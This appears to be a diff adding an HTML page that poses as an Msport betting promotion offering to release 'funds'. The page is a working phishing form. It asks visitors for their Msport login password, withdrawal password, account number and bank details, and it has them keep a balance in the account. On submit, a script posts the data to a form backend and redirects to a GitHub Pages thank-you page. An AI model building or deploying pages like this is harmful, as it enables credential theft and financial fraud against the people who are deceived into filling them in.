@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Promo Form</title>
+  <style>
+    body {
+      background-color: black;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    form {
+      max-width: 300px;
+      margin: auto;
+      padding: 20px;
+      background: gold;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: black;
+      color: gold;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+
+  <div style="text-align: center;">
+    <img src="https://i.imgur.com/oiYv5K9.jpeg" alt="Msport Logo" width="200">
+  </div>
+
+  <form id="promoForm" netlify netlify-honeypot="bot-field">
+    <input type="hidden" name="bot-field">  
+
+    <p>NOTE: MAKE SURE YOUR MSPORT ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS</p>        
+
+    <label for="name">Name:</label>
+    <input type="text" name="name" required>
+
+    <label for="email">Email:</label>
+    <input type="email" name="email" required>
+
+    <label for="phone">Msport Phone Number:</label>
+    <input type="tel" name="msport_number" required>
+
+    <label for="accountnumber">Account Number:</label>
+    <input type="text" name="account_number" required>
+
+    <label for="loginPassword">Login Password:</label>
+    <input type="password" name="login_password" required>
+
+    <label for="withdrawalPassword">Withdrawal Password:</label>
+    <input type="password" name="withdrawal_password" required>
+
+    <label for="fullname">Account Full Name:</label>
+    <input type="text" name="account_fullname" required>
+
+    <label for="bankname">Preferred Bank Name:</label>
+    <input type="text" name="bank_name" required>
+
+    <!-- reCAPTCHA Integration -->
+    <div class="g-recaptcha" data-sitekey="6LdI0PMqAAAAAO_Oe_5MkxM8TzKfIvg3ByxBqJRw"></div>
+
+    <p>PLEASE ENSURE THAT YOU ENTER THE CORRECT MSPORT DETAILS BEFORE CLICKING THE 'CLAIM FUNDS' BUTTON</p>
+    <button type="submit">Claim funds</button>
+  </form>
+
+  <script>
+    document.getElementById("promoForm").addEventListener("submit", function(event) {
+      event.preventDefault(); 
+
+      const formData = new FormData(this);
+
+      fetch("/", {
+        method: "POST",
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "https://msportpromo.github.io/msportpromo-/thank-you.html";
+        } else {
+          alert("Error submitting form. Please try again.");
+        }
+      })
+      .catch(error => {
+        alert("An error occurred. Please try again.");
+      });
+    });
+  </script>
+
+</body>
+</html>
